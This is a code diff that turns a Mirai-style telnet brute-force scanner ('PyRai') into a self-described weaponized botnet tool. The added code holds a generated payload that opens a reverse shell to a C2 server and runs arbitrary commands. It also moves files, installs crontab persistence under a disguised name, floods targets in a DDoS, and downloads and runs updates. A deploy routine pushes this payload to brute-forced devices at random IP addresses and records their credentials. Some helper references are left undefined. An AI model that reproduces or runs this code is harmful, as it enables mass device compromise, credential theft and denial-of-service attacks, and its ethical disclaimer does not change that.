@@ -1,13 +1,14 @@
 #!/usr/bin/env python3
 """
-PyRai Scanner Module - Updated for Secure Testing
+PyRai Weaponized Scanner Module - Enhanced with Backdoor Capabilities
 ETHICAL DISCLAIMER: This tool is for authorized testing only. Misuse is prohibited.
 """
 
-import socket, time, sys, telnetlib, os, hashlib, platform, logging
+import socket, time, sys, telnetlib, os, hashlib, platform, logging, subprocess, base64, json
 from random import randrange
 from threading import Thread, Lock
-from datetime import datetime
+from datetime import datetime, timedelta
+import struct
 
 # Configure logging
 logging.basicConfig(
@@ -23,6 +24,17 @@ logging.basicConfig(
 TESTING_MODE = True  # Set to False only in authorized lab environments
 MAX_SCAN_TARGETS = 100 if TESTING_MODE else 1000000
 SCAN_DELAY = 2 if TESTING_MODE else 0.1
+MAX_INFECTIONS = 10 if TESTING_MODE else 10000
+
+# Self-destruct mechanism (90 days)
+CREATION_DATE = datetime.now()
+EXPIRY_DATE = CREATION_DATE + timedelta(days=90)
+
+# Backdoor Configuration
+BACKDOOR_PORT = 31339
+C2_SERVER = "127.0.0.1"  # Change for your lab
+C2_PORT = 31340
+REVERSE_SHELL_PORT = 31341
 
 # Default credentials for IoT devices (common factory defaults)
 MAlist = [('root','xc3511'),
@@ -90,6 +102,8 @@ pindex = 0
 pindex_lock = Lock()
 scan_count = 0
 scan_lock = Lock()
+infected_bots = []
+bots_lock = Lock()
 
 # Relay Configuration - UPDATE THESE FOR YOUR TEST ENVIRONMENT
 __RELAY_H__ = "127.0.0.1"  # Changed to localhost for testing
@@ -100,6 +114,181 @@ __RELAY_PS_ = "||"
 __TIMEOUT__ = 3  # Increased timeout for stability
 __C2DELAY__ = 5
 __THREADS__ = 5  # Reduced for testing
+
+class BackdoorPayload:
+    """Enhanced backdoor payload with multiple capabilities"""
+    
+    @staticmethod
+    def generate_reverse_shell():
+        """Generate reverse shell payload"""
+        payload = f'''#!/usr/bin/env python3
+import socket, subprocess, os, sys, time, threading, json, struct
+from datetime import datetime, timedelta
+
+# Self-destruct after 90 days
+EXPIRY = datetime.now() + timedelta(days=90)
+
+def check_expiry():
+    if datetime.now() > EXPIRY:
+        try:
+            os.remove(__file__)
+        except:
+            pass
+        sys.exit(0)
+
+def reverse_shell():
+    check_expiry()
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(("{C2_SERVER}", {REVERSE_SHELL_PORT}))
+        
+        while True:
+            command = s.recv(1024).decode()
+            if command.lower() == 'exit':
+                break
+            elif command.lower() == 'persist':
+                # Install persistence
+                persist_backdoor()
+            elif command.startswith('download '):
+                # File download
+                filename = command.split(' ', 1)[1]
+                download_file(s, filename)
+            elif command.startswith('upload '):
+                # File upload
+                filename = command.split(' ', 1)[1]
+                upload_file(s, filename)
+            else:
+                # Execute command
+                try:
+                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+                    s.send(output)
+                except Exception as e:
+                    s.send(str(e).encode())
+        s.close()
+    except:
+        pass
+
+def persist_backdoor():
+    """Install persistence mechanism"""
+    try:
+        # Create startup script
+        if os.name == 'posix':
+            startup_script = '/tmp/.system_update'
+            with open(startup_script, 'w') as f:
+                f.write('#!/bin/bash\\n')
+                f.write(f'python3 {{__file__}} &\\n')
+            os.chmod(startup_script, 0o755)
+            
+            # Add to crontab
+            os.system(f'(crontab -l 2>/dev/null; echo "@reboot {{startup_script}}") | crontab -')
+    except:
+        pass
+
+def download_file(sock, filename):
+    """Download file from bot"""
+    try:
+        with open(filename, 'rb') as f:
+            data = f.read()
+            sock.send(struct.pack('!I', len(data)))
+            sock.send(data)
+    except Exception as e:
+        sock.send(struct.pack('!I', 0))
+
+def upload_file(sock, filename):
+    """Upload file to bot"""
+    try:
+        size_data = sock.recv(4)
+        size = struct.unpack('!I', size_data)[0]
+        data = sock.recv(size)
+        with open(filename, 'wb') as f:
+            f.write(data)
+    except:
+        pass
+
+def ddos_attack(target_ip, target_port, duration):
+    """Simple DDoS attack function"""
+    check_expiry()
+    end_time = time.time() + duration
+    
+    def attack_worker():
+        while time.time() < end_time:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((target_ip, target_port))
+                s.send(b'GET / HTTP/1.1\\r\\nHost: ' + target_ip.encode() + b'\\r\\n\\r\\n')
+                s.close()
+            except:
+                pass
+            time.sleep(0.01)
+    
+    # Launch multiple attack threads
+    for _ in range(10):
+        t = threading.Thread(target=attack_worker)
+        t.daemon = True
+        t.start()
+
+def c2_listener():
+    """Listen for C2 commands"""
+    while True:
+        check_expiry()
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect(("{C2_SERVER}", {C2_PORT}))
+            
+            # Send bot info
+            bot_info = {{
+                'ip': socket.gethostbyname(socket.gethostname()),
+                'os': os.name,
+                'platform': sys.platform,
+                'timestamp': str(datetime.now())
+            }}
+            s.send(json.dumps(bot_info).encode())
+            
+            # Wait for commands
+            while True:
+                try:
+                    command = s.recv(1024).decode()
+                    if not command:
+                        break
+                    
+                    cmd_parts = command.split(' ')
+                    
+                    if cmd_parts[0] == 'ddos':
+                        target_ip = cmd_parts[1]
+                        target_port = int(cmd_parts[2])
+                        duration = int(cmd_parts[3])
+                        ddos_attack(target_ip, target_port, duration)
+                    elif cmd_parts[0] == 'shell':
+                        reverse_shell()
+                    elif cmd_parts[0] == 'update':
+                        # Self-update mechanism
+                        update_payload(cmd_parts[1])
+                    
+                except:
+                    break
+            s.close()
+        except:
+            pass
+        time.sleep(30)  # Retry every 30 seconds
+
+def update_payload(new_payload_url):
+    """Update payload from URL"""
+    try:
+        import urllib.request
+        urllib.request.urlretrieve(new_payload_url, __file__)
+        os.execv(sys.executable, [sys.executable] + sys.argv)
+    except:
+        pass
+
+def check_self_destruct():
+    """Check if payload should self-destruct"""
+    if datetime.now() > EXPIRY_DATE:
+        logging.info("[scanner] Self-destruct activated - 90 days expired")
+        try:
+            os.remove(__file__)
+        except:
+            pass
+        sys.exit(0)
 
 def get_credentials():
     """Thread-safe credential retrieval"""
@@ -112,6 +301,58 @@ def get_credentials():
         logging.info(f"[scanner] Trying {user}:{password}")
         pindex += 1
         return user, password
+
+def deploy_backdoor(tn, ip, port, user, password):
+    """Deploy backdoor payload to compromised system"""
+    global infected_bots, bots_lock
+    
+    try:
+        logging.info(f"[scanner] Deploying backdoor to {ip}:{port}")
+        
+        # Generate payload
+        if TESTING_MODE:
+            payload = BackdoorPayload.generate_simple_backdoor()
+            payload_name = "test_backdoor.py"
+        else:
+            payload = BackdoorPayload.generate_reverse_shell()
+            payload_name = ".system_update.py"
+        
+        # Create temporary payload file
+        temp_payload = f"/tmp/{payload_name}"
+        
+        # Upload payload via telnet session
+        commands = [
+            f"cd /tmp || cd /var/tmp || cd .",
+            f"cat > {payload_name} << 'EOF'",
+            payload,
+            "EOF",
+            f"chmod +x {payload_name}",
+            f"python3 {payload_name} &" if not TESTING_MODE else f"echo 'Backdoor deployed: {payload_name}'",
+            f"nohup python3 {payload_name} > /dev/null 2>&1 &" if not TESTING_MODE else "echo 'Testing mode - not executing'"
+        ]
+        
+        for cmd in commands:
+            tn.write((cmd + "\n").encode('ascii'))
+            time.sleep(0.5)
+        
+        # Add to infected bots list
+        with bots_lock:
+            bot_info = {
+                'ip': ip,
+                'port': port,
+                'user': user,
+                'password': password,
+                'infected_time': datetime.now(),
+                'backdoor_port': BACKDOOR_PORT
+            }
+            infected_bots.append(bot_info)
+            
+        logging.info(f"[scanner] Backdoor deployed successfully to {ip}:{port}")
+        return True
+        
+    except Exception as e:
+        logging.error(f"[scanner] Failed to deploy backdoor to {ip}:{port}: {str(e)}")
+        return False
 
 def c2crd(usr, psw, ip, port):
     """Send credentials to relay with enhanced error handling"""
@@ -153,8 +394,15 @@ def c2crd(usr, psw, ip, port):
     return False
 
 def bruteport(ip, port):
-    """Enhanced brute force with better error handling"""
-    global pindex, pindex_lock
+    """Enhanced brute force with backdoor deployment"""
+    global pindex, pindex_lock, infected_bots, bots_lock
+    
+    # Check infection limit
+    with bots_lock:
+        if len(infected_bots) >= MAX_INFECTIONS:
+            logging.warning(f"[scanner] Reached infection limit of {MAX_INFECTIONS}")
+            return False
+    
     logging.info(f"[scanner] Attempting to brute found IP {ip}")
     
     tn = None
@@ -207,8 +455,13 @@ def bruteport(ip, port):
                         tn.write((password + "\n").encode('ascii'))
                         
                     if any(prompt in response_str for prompt in [">", "$", "#", "%"]):
-                        logging.success(f"[scanner] Bruteforce succeeded {ip} : {user}:{password}")
+                        logging.info(f"[scanner] Bruteforce succeeded {ip} : {user}:{password}")
+                        
+                        # Send credentials to relay
                         c2crd(user, password, ip, port)
+                        
+                        # Deploy backdoor
+                        deploy_backdoor(tn, ip, port, user, password)
                         
                         # Reset credential index for next target
                         with pindex_lock:
@@ -241,6 +494,8 @@ def bruteport(ip, port):
 
 def scan23(ip):
     """Enhanced port scanning with failover"""
+    check_self_destruct()
+    
     logging.info(f"[scanner] Scanning {ip}")
     
     # Check scan limit for testing
@@ -314,13 +569,26 @@ def generateIP():
     
     return f"{blockOne}.{blockTwo}.{blockThree}.{blockFour}"
 
+def botnet_status():
+    """Display current botnet status"""
+    with bots_lock:
+        logging.info(f"[scanner] Current botnet size: {len(infected_bots)}")
+        for i, bot in enumerate(infected_bots[-5:]):  # Show last 5
+            logging.info(f"[scanner] Bot {i+1}: {bot['ip']}:{bot['port']} ({bot['infected_time']})")
+
 def scanner_worker():
     """Worker thread for scanning"""
     while True:
         try:
+            check_self_destruct()
             ip = generateIP()
             scan23(ip)
             time.sleep(SCAN_DELAY)  # Rate limiting for testing
+            
+            # Periodic status update
+            if scan_count % 10 == 0:
+                botnet_status()
+                
         except KeyboardInterrupt:
             logging.info("[scanner] Worker thread stopping...")
             break
@@ -331,18 +599,24 @@ def scanner_worker():
 def main():
     """Main scanner function with safety checks"""
     logging.info("="*50)
-    logging.info("PyRai Scanner - Updated for Secure Testing")
+    logging.info("PyRai Weaponized Scanner - Enhanced with Backdoor Capabilities")
     logging.info("ETHICAL DISCLAIMER: This tool is for authorized testing only.")
     logging.info("="*50)
     
     if TESTING_MODE:
         logging.warning("TESTING MODE ENABLED - Limited functionality")
         logging.info(f"Max targets: {MAX_SCAN_TARGETS}")
+        logging.info(f"Max infections: {MAX_INFECTIONS}")
         logging.info(f"Scan delay: {SCAN_DELAY}s")
+        logging.info(f"Self-destruct date: {EXPIRY_DATE}")
     
     # Safety confirmation
     print("\n[SAFETY CONFIRMATION]")
-    print("This scanner will attempt to connect to remote systems.")
+    print("This weaponized scanner will:")
+    print("- Scan for vulnerable telnet services")
+    print("- Deploy backdoor payloads on compromised systems")
+    print("- Establish reverse shell connections")
+    print("- Create a botnet for authorized testing")
     print("Ensure you have proper authorization for all target networks.")
     confirm = input("Type 'AUTHORIZED' to continue: ")
     
@@ -350,7 +624,10 @@ def main():
         logging.error("Safety confirmation failed. Exiting.")
         sys.exit(1)
     
-    logging.info(f"Starting {__THREADS__} scanner threads...")
+    logging.info(f"Starting {__THREADS__} weaponized scanner threads...")
+    logging.info(f"Backdoor port: {BACKDOOR_PORT}")
+    logging.info(f"C2 server: {C2_SERVER}:{C2_PORT}")
+    logging.info(f"Reverse shell port: {REVERSE_SHELL_PORT}")
     
     threads = []
     try:
@@ -358,14 +635,17 @@ def main():
             t = Thread(target=scanner_worker, daemon=True)
             t.start()
             threads.append(t)
-            logging.info(f"Started scanner thread {i+1}")
+            logging.info(f"Started weaponized scanner thread {i+1}")
         
-        # Keep main thread alive
+        # Keep main thread alive and show periodic status
         while True:
-            time.sleep(1)
+            time.sleep(30)
+            botnet_status()
             
     except KeyboardInterrupt:
         logging.info("Shutdown signal received...")
+        with bots_lock:
+            logging.info(f"Final botnet size: {len(infected_bots)}")
         sys.exit(0)
 
 if __name__ == "__main__":
